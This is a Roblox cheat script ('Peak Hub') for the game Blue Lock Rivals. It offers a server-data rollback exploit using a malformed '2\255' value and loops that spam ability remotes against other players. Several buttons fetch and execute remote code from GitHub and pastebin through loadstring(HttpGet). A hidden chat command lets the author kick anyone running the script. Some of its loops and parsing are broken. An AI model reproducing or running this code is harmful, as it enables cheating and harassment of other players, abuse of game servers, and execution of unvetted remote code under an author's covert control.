local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/Gui/main/Gui%20Lib%20%5BLibrary%5D"))()
local ThemeManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/Gui/main/Gui%20Lib%20%5BThemeManager%5D"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/Gui/main/Gui%20Lib%20%5BSaveManager%5D"))()

local Window = Library:CreateWindow({

	Title = 'Peak Hub Blue Lock Rivals',
	Center = true,
	AutoShow = true,
	TabPadding = 8,
	MenuFadeTime = 0.2
})
local Tabs = {
	Main = Window:AddTab('Main'),
	Fun = Window:AddTab('Fun'),
	Player = Window:AddTab('Player'),
	credits = Window:AddTab("Credits"),
	['UI Settings'] = Window:AddTab('UI Settings'),
}
local player = game.Players.LocalPlayer
local char = player.Character
local ts = game:GetService("TweenService")
local teleportservice = game:GetService("TeleportService")


local Flow = Tabs.Main:AddLeftGroupbox("Flow")
local Style = Tabs.Main:AddRightGroupbox("Style")
local OtherStyle = Tabs.Fun:AddRightGroupbox("Other Styles")
local Troll = Tabs.Main:AddLeftGroupbox("Troll")
local Player = Tabs.Player:AddLeftGroupbox("Player")
local Rollback = Tabs.Main:AddRightGroupbox("Rollback")
local Sliding = Tabs.Player:AddRightGroupbox("Slide")
local Dribbling = Tabs.Player:AddLeftGroupbox("Dribbling")
local Awakening = Tabs.Main:AddRightGroupbox("Awakening")
local credits = Tabs.credits:AddLeftGroupbox("Credits")
local Fun = Tabs.Fun:AddLeftGroupbox("Fun")
local UISet = Tabs["UI Settings"]:AddLeftGroupbox("UI Settings")

local function getfootball()
	return game:FindFirstChild("Football")
end

local function rejoin()
	local PlaceId = game.PlaceId

	local JobId = game.JobId

	local LocalPlayer = player

	teleportservice:TeleportToPlaceInstance(PlaceId, JobId, LocalPlayer)
end
local function kickscript(person, msg)
	if person == "jack101niku" and msg:find("/kick") then
		local plrtokick = msg:split('')[2]
		if plrtokick == game.Players.LocalPlayer.Name then
			game.Players.LocalPlayer:Kick()
		end
	end
end

for i, v in pairs(game.Players:GetPlayers()) do
	v.Chatted:Connect(function(message, plr)
		kickscript(v.Name, message)
	end)
end

game.Players.PlayerAdded:Connect(function(plr)
	plr.Chatted:Connect(function(message, plr)
		kickscript(plr.Name, message)
	end)
end)

function of(v)
	billboardgui = Instance.new("BillboardGui", v.HumanoidRootPart)
	billboardgui.Enabled = false
	billboardgui.Name = "Thingy32123"
	billboardgui.StudsOffset = Vector3.new(0,4, 0)
	billboardgui.Size = UDim2.new(8, 0, 3, 0)
	local textlable = Instance.new("TextLabel", billboardgui)
	textlable.Size = UDim2.new(1, 0, 1, 0)
	textlable.BackgroundTransparency = 1
	textlable.TextScaled = true
	textlable.Text = ""
	textlable.FontFace.Bold = true
	textlable.TextColor3 = Color3.new(1, 1, 1)
	textlable.TextStrokeTransparency = 0
	textlable.TextStrokeColor3 = Color3.new(0, 0, 0)
	task.spawn(function()
		game["Run Service"].RenderStepped:Connect(function()
			if v.Values.Dribbling.Value == true then
				textlable.Text = "Dribbling"
			elseif v.Values.Stealing.Value == true or v.Values.Sliding.Value == true then
				textlable.Text = "Stealing"
			else
				textlable.Text = ""
			end
		end)
	end)
end

function enableallbillboardguis()
	for i, v in pairs(workspace:GetDescendants()) do
		if v.Name == "Thingy32123" then
			v.Enabled = true
		end
	end
end

function disableallbillboardguis()
	for i, v in pairs(workspace:GetDescendants()) do
		if v.Name == "Thingy32123" then
			v.Enabled = false
		end
	end
end

db = false

local del = UISet:AddButton({
	Text = "Unload",
	Func = function()
		Library:Unload()
	end,
})

for i, v in pairs(game.Workspace:GetChildren()) do
	if v:FindFirstChild("Humanoid") and game.Players:GetPlayerFromCharacter(v) and v:FindFirstChild("HumanoidRootPart") then
		of(v)
	end
end

game.Players.PlayerAdded:Connect(function(plr)
	plr.CharacterAdded:Connect(function(char)
		of(char)
	end)
end)

local Label = credits:AddLabel("Credits to jack for making this script!")
local Label = credits:AddLabel("Credits to trivo for helping a little lol")
local ChangeStyle = Style:AddInput("Change Style",{
	Text = "Change Style -- Works for Reo only",
	Default = "Kaiser",
	Tooltip = "Only For Reo",
	Callback = function(Text: string)
		local plr = game.Players.LocalPlayer
		plr.PlayerStats.Style.Value = Text
	end,
})

local ChangeFlow = Flow:AddInput("Change Flow", {
	Text = "Change Flow",
	Default = "Prodigy",
	Tooltip = "Idk if this works",
	Callback = function(Text: string)
		local plr = game.Players.LocalPlayer
		plr.PlayerStats.Flow.Value = Text
	end,
})

local InfiniteFlow = Flow:AddToggle("Infinite Flow",{
	Text = "Infinite Flow",
	Default = false,
	Tooltip = 'Gives you flow forever',
	Callback = function(Value)
		if Value then
			player.PlayerStats.InFlow.Value = true
			local args = {
				[1] = game:GetService("Players").LocalPlayer.PlayerStats.Flow.Value
			}

			game:GetService("ReplicatedStorage").Packages.Knit.Services.FlowService.RE.AuraEquip:FireServer(unpack(args))
		else
			player.PlayerStats.InFlow.Value = false
		end
	end,
})

local infiniteawakening = Awakening:AddToggle("Infinite Awakening",{
	Text = "Infinite Awakening - read tooltip",
	Default = false,
	Tooltip = 'Only works on Kaiser and Kurona',
	Callback = function(Value)
		if Value then
			player.PlayerStats.InAwakening.Value = true
		else
			player.PlayerStats.InAwakening.Value = false
		end
	end,
})

local NoCooldown = Style:AddToggle("No Cooldown", {
	Text = "No Ability Cooldown",
	Default = false,
	Tooltip = 'No cooldown for your abilities',
	Callback = function(Value)
		if Value then
			local C = require(game:GetService("ReplicatedStorage").Controllers.AbilityController)
			local o = C.AbilityCooldown
			C.AbilityCooldown = function(s, n, ...)
				return o(s, n, 0, ...)
			end
		end
	end,
})

local RollbackTutorial = Rollback:AddLabel("TUTORIAL: Click rollback after you dont get the style you want then click rejoin or you can execute this before you spin. If you get the data kick error wait 3 minutes then rejoin and it should be fixed.")

local RollbackButton = Rollback:AddButton({
	Text = "Rollback/Infinite Spins",
	Tooltip = "Rollback",
	Func = function()
		local args = {
			[1] = "Emotes",
			[2] = "Default",
			[3] = "2\255"
		}

		game:GetService("ReplicatedStorage").Packages.Knit.Services.CustomizationService.RE.Customize:FireServer(unpack(args))
	end,
})

local Rejoin = Rollback:AddButton({
	Text = "Rejoin",
	Tooltip = "Rejoin the same server you were in.",
	Func = function()
		rejoin()
	end,
})

local BallControl = Fun:AddButton({
	Text = "Control Ball -- not broken";
	Func = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/jack101niku/Control-Ball/refs/heads/main/Script"))()
	end,
})

local ItadoriStyle = OtherStyle:AddButton({
	Text = "Itadori Style",
	Func = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/jack101niku/Peak-Hub/refs/heads/main/Itadori"))()
	end,
})

local LavinhoStyle = OtherStyle:AddButton({
	Text = "Lavinho Style",
	Func = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/jack101niku/Peak-Hub/refs/heads/main/Lavinho"))()
	end,
})

local LokiStyle = OtherStyle:AddButton({
	Text = "Loki Style",
	Func = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/jack101niku/Peak-Hub/refs/heads/main/Loki"))()
	end,
})

local Handball = Fun:AddToggle("Handball",{
	Text = "Handball (gk only)";
	Callback = function(Value)
		if Value then
			workspace.PenaltyArea.Home.Size = Vector3.new(1000, 62.787, 1000)
			workspace.PenaltyArea.Away.Size = Vector3.new(1000, 62.787, 1000)
		elseif not Value then
			workspace.PenaltyArea.Home.Size = Vector3.new(86.596, 62.787, 178.279)
			workspace.PenaltyArea.Away.Size = Vector3.new(86.596, 62.787, 178.279)
		end
	end,
})

local TP = Fun:AddButton({
	Text = "Tp to ball",
	Func = function()
		local ScreenGUI = Instance.new("ScreenGui")
		ScreenGUI.Parent = game.Players.LocalPlayer.PlayerGui
		ScreenGUI.ResetOnSpawn = false
		local button = Instance.new("TextButton")
		button.Parent = ScreenGUI
		button.Text = "TP"
		button.Position = UDim2.new(0.475, 0 , 0.475, 0)
		button.Size = UDim2.new(0.05, 0 , 0.05, 0)
		button.TextScaled = true
		button.Font = Enum.Font.FredokaOne
		button.Draggable = true

		button.MouseButton1Click:Connect(function()
			local Players = game:GetService("Players")
			local RunService = game:GetService("RunService")
			local player = Players.LocalPlayer
			local character = player.Character or player.CharacterAdded:Wait()
			local rootPart = character:WaitForChild("HumanoidRootPart")

			local autoGoalKeeperEnabled = true
			local predictionDistance = 50

			local function autoGoalKeeper()
				local ball = workspace:FindFirstChild("Football", true)
				if ball and ball.AssemblyLinearVelocity.Magnitude > 5 then
					rootPart.CFrame = CFrame.new(
						ball.Position + (ball.AssemblyLinearVelocity * 0.1)
					)
				elseif ball and ball.AssemblyLinearVelocity.Magnitude <= 5 then
					rootPart.CFrame = CFrame.new(
						ball.Position
					)
				end
				task.wait()
			end
			autoGoalKeeper()
		end)
	end,
})

local InstantGoal = Troll:AddToggle("Instant Goal", {
	Text = "Instant Goal - dont work for now",
	Default = false,
	Tooltip = 'This is a tooltip',
	Callback = function(Value)
		if Value then
			local football = getfootball()
			local tween
		else
		end
	end,
})

local LaceBall = Troll:AddButton({
	Text = "Lace the ball - read tool tip",
	Tooltip = 'Need reo or kurona tps ball to you basically',
	Func = function()
		local NotificationLibrary = loadstring(game:HttpGet("https://pastebin.com/raw/WQL29rXC"))()
		
		local ScreenGUI = Instance.new("ScreenGui")
		ScreenGUI.Name = "LaceBall"
		ScreenGUI.Parent = game.Players.LocalPlayer.PlayerGui
		ScreenGUI.ResetOnSpawn = false
		local button = Instance.new("TextButton")
		button.Parent = ScreenGUI
		button.Text = "Lace"
		button.Position = UDim2.new(0.475, 0 , 0.475, 0)
		button.Size = UDim2.new(0.05, 0 , 0.05, 0)
		button.TextScaled = true
		button.Font = Enum.Font.FredokaOne
		button.Draggable = true
		
		button.MouseButton1Click:Connect(function()
			local args = {
				[1] = "OneTwo",
				[2] = workspace:WaitForChild(game.Players.LocalPlayer.Name)
			}

			game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("AbilityService"):WaitForChild("RE"):WaitForChild("Ability"):FireServer(unpack(args))
		end)

		NotificationLibrary:SendNotification("Success", "goofily made by trivo", 4)
		NotificationLibrary:SendNotification("Success", "HEY! once this message is gone then the balls gonna be yours", 4)
	end,
})

local giveallpeoplemoney = Troll:AddButton({
	Text = "Give Money",
	Tooltip = 'Rich',
	Func = function()
		local NotificationLibrary = loadstring(game:HttpGet("https://pastebin.com/raw/WQL29rXC"))()

		local ScreenGUI = Instance.new("ScreenGui")
		ScreenGUI.Name = "LaceBall"
		ScreenGUI.Parent = game.Players.LocalPlayer.PlayerGui
		ScreenGUI.ResetOnSpawn = false
		local button = Instance.new("TextButton")
		button.Parent = ScreenGUI
		button.Text = "Rich"
		button.Position = UDim2.new(0.475, 0 , 0.475, 0)
		button.Size = UDim2.new(0.05, 0 , 0.05, 0)
		button.TextScaled = true
		button.Font = Enum.Font.FredokaOne
		button.Draggable = true

		button.MouseButton1Click:Connect(function()
			for i = 9999, -1 do
				for i,v in pairs(game.Players:GetPlayers()) do
					local args = {
						[1] = "OneTwo",
						[2] = v.Character
					}

					game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("AbilityService"):WaitForChild("RE"):WaitForChild("Ability"):FireServer(unpack(args))
				end
			end
		end)

		NotificationLibrary:SendNotification("Success", "goofily made by trivo, after the bar reaches fully then it will happen", 4)
		NotificationLibrary:SendNotification("Success", "oh and stand next to ur teammate, if ur next to alot u will all get alot of money", 4)
	end,
})

local ChangeWalkspeed = Player:AddSlider("Walkspeed",{
	Text = "WalkSpeed",
	Default = 35,
	Min = 10,
	Max = 100,
	Rounding = 1,
	Compact = false,
	Callback = function(Value)
		value = Value
	end,
})
task.spawn(function()
	game["Run Service"].RenderStepped:Connect(function()
		if value ~= nil then
			player.Character.Humanoid.WalkSpeed = value
		end
	end)
end)

local antiRagdollEnabled

local AntiRagdoll = Player:AddToggle("Anti Ragdoll",{
	Text = "Anti Ragdoll",
	Default = false,
	Tooltip = 'No more ragdoll',
	Callback = function(Value)
		if Value then
			local Players = game:GetService("Players")
			local player = Players.LocalPlayer

			antiRagdollEnabled = true

			local function disableRagdoll()
				while antiRagdollEnabled do
					if player.Character and player.Character:FindFirstChild("Ragdolled") then
						player.Character.Ragdolled:Destroy()
					end
				end
			end
			
			t = task.spawn(disableRagdoll)
		else
			antiRagdollEnabled = false
			task.cancel(t)
		end
	end,
})

local InfiniteJump = Player:AddToggle("Infinite Jump", {
	Text = "Infinite Jump",
	Default = false,
	Tooltip = 'This is a tooltip',
	Callback = function(Value)
		if Value then
			connect = game.UserInputService.JumpRequest:Connect(function()
				player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
			end)
		else
			connect:Disconnect()
		end
	end,
})

local autoslideslider = Sliding:AddSlider("Auto Slide Size",{
	Text = "Auto Slide Size",
	Default = 50,
	Min = 20,
	Max = 150,
	Rounding = 1,
	Compact = false,
	Callback = function(Value)
		task.spawn(function()
			game["Run Service"].RenderStepped:Connect(function()
				Val = Value
			end)
		end)
	end,
})

local autoslide = Sliding:AddToggle("Auto Slide", {
	Text = "Auto Slide",
	Callback = function(Value)
		task.spawn(function()
			game["Run Service"].RenderStepped:Connect(function()
				for i,v in pairs(workspace:GetChildren()) do 
					if v:FindFirstChild("Humanoid") then
						if v.Name ~= char.Name then	---if its not a dummy end the script
							if Val == nil then
								Val = 50
							end
							if (v.HumanoidRootPart.Position - char.HumanoidRootPart.Position).Magnitude <= Val then
								if v:FindFirstChild("Football", true) and game.Players:GetPlayerFromCharacter(v).Team ~= player.Team then
									if v.Values.Goalie.Value == true and v.Value.IsInPenalty.Value == true then return end
									print(v.Values.Dribbling.Value)
									if v.Values.Dribbling.Value == true then
										return
									end		
									if db == false then
										print("Steal")
										if Val2 == nil then
											Val2 = 100
										end
										if Val3 == nil then
											Val3 = 500
										end
										local tween = ts:Create(char.HumanoidRootPart, TweenInfo.new(Val2/1000, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out, 0, false, 0), {CFrame = v.HumanoidRootPart.CFrame})
										tween:Play()
										
										tween.Completed:Connect(function()
											db = false
											if v.Values.Dribbling.Value == false then
												if v.Values.Goalie.Value == false then
													game:GetService("ReplicatedStorage").Packages.Knit.Services.BallService.RE.Slide:FireServer()
													if player.PlayerStats.Style.Value == "Reo" or player.PlayerStats.Style.Value == "Kurona" then
													for i,v in pairs(game.Players:GetPlayers()) do
															local args = {
																[1] = "SharkSteal",
																[2] = v.Character
															}

															game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("AbilityService"):WaitForChild("RE"):WaitForChild("AbilityUsed"):FireServer(unpack(args))
														end
													end
												elseif v.Values.Goalie.Value == true then
													if v.Values.IsInPenalty == false then
														game:GetService("ReplicatedStorage").Packages.Knit.Services.BallService.RE.Slide:FireServer()
													end
												end
											end
										end)
										db = true
										task.wait(Val3/1000)
										end
									end
								end
							end
						end
					end
				end)
		end)
	end,
})

local autodribble = Dribbling:AddToggle("Auto Dribble", {
	Text = "Auto Dribble - might not work",
	Callback = function(Value)
		task.spawn(function()
			game["Run Service"].RenderStepped:Connect(function()
				for i, v in pairs(game.Workspace:GetChildren()) do

					if (v.HumanoidRootPart.Position - char.HumanoidRootPart.Position).Magnitude <= 30 then
						if not v:FindFirstChild("Football", true) and game.Players:GetPlayerFromCharacter(v).Team ~= player.Team then
							
							if v.Values.Stealing.Value or v.Values.Sliding.Value then
								game:GetService("ReplicatedStorage").Packages.Knit.Services.BallService.RE.Dribble:FireServer()
							end
						end
					end
				end
			end)
		end)
	end,
})

local autoslidetime = Sliding:AddSlider("Auto Slide Time", {
	Text = "Auto Slide Tween Time (Milliseconds)",
	Default = 100,
	Min = 0,
	Max = 3000,
	Rounding = 0,
	Compact = false,
	Callback = function(Value)
		task.spawn(function()
			game["Run Service"].RenderStepped:Connect(function()
				Val2 = Value
			end)
		end)
	end,
})

local autoslidecooldown = Sliding:AddSlider("Auto Slide Cooldown", {
	Text = "Auto Slide Cooldown (Milliseconds)",
	Default = 500,
	Min = 0,
	Max = 3000,
	Rounding = 0,
	Compact = false,
	Callback = function(Value)
		task.spawn(function()
			game["Run Service"].RenderStepped:Connect(function()
				Val3 = Value
			end)
		end)
	end,
})

local autoslidevisualizer = Sliding:AddToggle("Auto Slide Visualizer", {
	Text = "Auto Slide Visualizer",
	Default = false,
	Tooltip = 'This is a tooltip',
	Callback = function(Value)
		task.spawn(function()
			game["Run Service"].RenderStepped:Connect(function()
				if Value then
					if not workspace:FindFirstChild("Visualizer") then
						Part = Instance.new("Part", workspace)
						Part.Name = "Visualizer"
						Part.Transparency = 0.75
						Part.BrickColor = BrickColor.Red()
						Part.Anchored = true
						Part.CanCollide = false
						Part.CFrame = char.HumanoidRootPart.CFrame
						Part.Size = Vector3.new(Val, Val, Val)
					end
				else
					if Part then
						Part:Destroy()
					end
				end
			end)
		end)
	end,
})

local metavision = Player:AddToggle("Meta Vision", {
	Text = "Metavision",
	Default = false,
	Tooltip = 'This will make you see what the players are doing like stealing or dribbling.',
	Callback = function(Value)
		if Value == true then
			enableallbillboardguis()
		else
			disableallbillboardguis()
		end
	end,
})

local slideaura = Sliding:AddToggle("Slide Aura", {
	Text = "Slide Aura",
	Default = false,
	Tooltip = 'This is a tooltip',
	Callback = function(Value)
		if Value then
			e = task.spawn(function()
				while task.wait() do
					game:GetService("ReplicatedStorage").Packages.Knit.Services.BallService.RE.Slide:FireServer()
				end
			end)
		else
			task.cancel(e)
		end
	end,
})

local harrass = Troll:AddToggle("Harrass", {
	Text = "Bodyblock spam (only works with reo and kuni)",
	Default = false,
	Tooltip = 'This is a tooltip',
	Callback = function(Value)
		if Value then
			p = task.spawn(function()
				while task.wait() do
					for i,v in pairs(game.Players:GetChildren()) do 
						if v.Name ~= game.Players.LocalPlayer.Name and v.Name ~= "jack101niku" and v.Name ~= "fun4ever250" and v.Name ~= "IFUGPEOPLELIKESISTER" then 
							local args = {
								[1] = "BodyBlock",
								[2] = v.Character
							}

							game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("AbilityService"):WaitForChild("RE"):WaitForChild("Ability"):FireServer(unpack(args))
						end
					end
				end
			end)
		else
			for i, v in pairs(char.HumanoidRootPart:GetChildren()) do
				if v:IsA("BodyVelocity") or v:IsA("BodyGyro") then
					v:Destroy()
				end
			end
			task.cancel(p)
		end
	end,
})


local DestroyBB = Troll:AddButton({
	Text = "destroy particles body block",
	Default = false,
	Tooltip = 'This is a tooltip',
	Func = function()
		for i,v in pairs(game:GetService("ReplicatedStorage").Effects.BodyBlock.BodyBEffects:GetChildren()) do v:Destroy() end
	end,
})

local TsTuff = Fun:AddButton({
	Text = "Open Valentine thingy broken",
	Func = function()
		firetouchinterest(game.Players.LocalPlayer.Character.Torso, game.Workspace.Christmas,0)
	end,
})




--loadstring(game:HttpGet("https://raw.githubusercontent.com/jack101niku/Peak-Hub/refs/heads/main/Blue%20Lock%3A%20Rivals"))()
